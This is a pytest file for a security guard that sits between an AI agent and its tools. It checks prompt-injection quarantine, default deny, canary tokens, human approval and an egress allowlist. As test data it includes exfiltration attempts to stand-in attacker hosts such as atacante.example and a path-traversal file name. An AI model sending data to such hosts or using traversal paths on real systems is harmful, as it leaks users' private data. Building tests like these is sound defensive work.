import pytest

from secmcp.guard import Guard
from secmcp.policy import Verdict


def test_default_deny(guard):
    r = guard.call("borrar_todo", {})
    assert not r.ok and r.rule == "default-deny"


def test_busqueda_benigna_permitida(guard):
    r = guard.call("search_docs", {"query": "viáticos tope"})
    assert r.ok and "3.000" in r.text and "datos_no_confiables" in r.text


def test_documento_envenenado_queda_en_cuarentena(guard):
    r = guard.call("search_docs", {"query": "novedades centro reunión"})
    assert r.ok and r.flagged and "RETENIDO" in r.text and "credenciales" not in r.text


def test_destino_fuera_de_lista_blanca(guard):
    r = guard.call("send_report", {"to": "x@atacante.example", "body": "hola"})
    assert not r.ok and r.rule == "egress-allowlist"


def test_subdominio_engañoso_no_pasa(guard):
    r = guard.call("http_post", {"url": "https://ejemplo.uy.atacante.example/x", "body": "hola"})
    assert not r.ok and r.rule == "egress-allowlist"


def test_canario_bloqueado_aun_hacia_destino_permitido(guard):
    guard.call("read_private_note", {"name": "credenciales.txt"})
    r = guard.call("send_report", {"to": "jefe@ejemplo.uy", "body": "CANARIO-7f3a91"})
    assert not r.ok and r.rule == "canary"


def test_triada_letal_requiere_aprobacion(guard):
    guard.call("search_docs", {"query": "viáticos"})          # contenido no confiable
    guard.call("read_private_note", {"name": "agenda.txt"})  # dato privado
    r = guard.call("send_report", {"to": "jefe@ejemplo.uy", "body": "resumen"})
    assert not r.ok and r.verdict == Verdict.NEEDS_APPROVAL.value


def test_aprobacion_humana_habilita_y_exige_revisor(guard):
    guard.call("search_docs", {"query": "viáticos"})
    guard.call("read_private_note", {"name": "agenda.txt"})
    with pytest.raises(ValueError):
        guard.approve("ap-0001", " ")
    guard.approve("ap-0001", "supervisora")
    r = guard.call("send_report", {"to": "jefe@ejemplo.uy", "body": "resumen"}, approval_id="ap-0001")
    assert r.ok and r.rule == "human-approved"


def test_aprobacion_no_salta_la_lista_blanca(guard):
    guard.call("search_docs", {"query": "viáticos"})
    guard.call("read_private_note", {"name": "agenda.txt"})
    guard.approve("ap-0002", "supervisora")
    r = guard.call("send_report", {"to": "x@atacante.example", "body": "resumen"}, approval_id="ap-0002")
    assert not r.ok and r.rule == "egress-allowlist"


def test_recorrido_de_ruta(guard):
    r = guard.call("read_private_note", {"name": "../docs/guia_compras.md"})
    assert not r.ok and r.rule == "tool-error"


def test_flujo_legitimo_sin_contenido_no_confiable(guard):
    guard.call("read_private_note", {"name": "agenda.txt"})
    r = guard.call("send_report", {"to": "jefe@ejemplo.uy", "body": "Reunión el martes."})
    assert r.ok


def test_auditoria_registra_decisiones(guard):
    guard.call("borrar_todo", {})
    assert guard.session.audit[-1]["rule"] == "default-deny"


def test_sin_cuarentena_se_entrega_envuelto(toolbox):
    g = Guard.build(toolbox, ("ejemplo.uy",), ())
    g.quarantine_injections = False
    r = g.call("search_docs", {"query": "novedades centro reunión"})
    assert r.flagged and "datos_no_confiables" in r.text
